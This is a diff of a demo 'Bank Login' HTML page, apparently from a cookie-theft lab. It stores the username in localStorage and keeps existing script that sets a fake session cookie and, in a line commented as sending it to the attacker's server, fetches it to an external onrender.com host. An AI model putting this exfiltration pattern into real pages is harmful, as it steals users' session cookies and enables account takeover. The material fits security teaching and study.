@@ -16,7 +16,7 @@
     <div class="bank-card">
         <h1>Bank Login</h1>
         <form id="loginForm">
-            <input type="text" placeholder="Username" required><br>
+            <input type="text" id="username" placeholder="Username" required><br>
             <input type="password" placeholder="Password" required><br>
             <button type="submit">Login</button>
         </form>
@@ -26,14 +26,18 @@
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault(); 
             
+            // שמירת שם המשתמש ב-localStorage כדי להציג אותו בדאשבורד
+            const username = document.getElementById('username').value;
+            localStorage.setItem('currentUser', username);
+            
             // 1. Create a fake session cookie as if the user logged in successfully
             document.cookie = "session_token=secret_user_12345; path=/";
             
             // 2. Trigger the "trap" - send the cookie to the attacker's server
             fetch('https://python-pickwiz.onrender.com/log?cookie=' + encodeURIComponent(document.cookie));
-            // שנה את השורה הזו בקובץ ה-HTML
-window.location.href = "/secure-zone/bank";
-            alert("Logged in successfully!");
+            
+            // 3. Redirect to the bank dashboard
+            window.location.href = "/secure-zone/bank";
         });
     </script>
 
